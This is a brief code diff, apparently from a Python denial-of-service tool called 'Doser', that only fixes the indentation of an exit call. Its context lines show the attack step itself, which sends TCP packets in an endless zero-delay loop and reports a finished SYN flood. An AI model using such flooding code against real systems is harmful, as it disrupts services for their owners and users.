@@ -114,7 +114,7 @@ class Doser(object):
             pkt = IP_layer/TCP_layer
             send(pkt, loop=1, inter=0.0, verbose=False)
             print "[-] SYN flood denial of service finalized."
-                        exit(0)
+            exit(0)
         except Exception as e:
             print "[!] Error: {}".format(e)
 
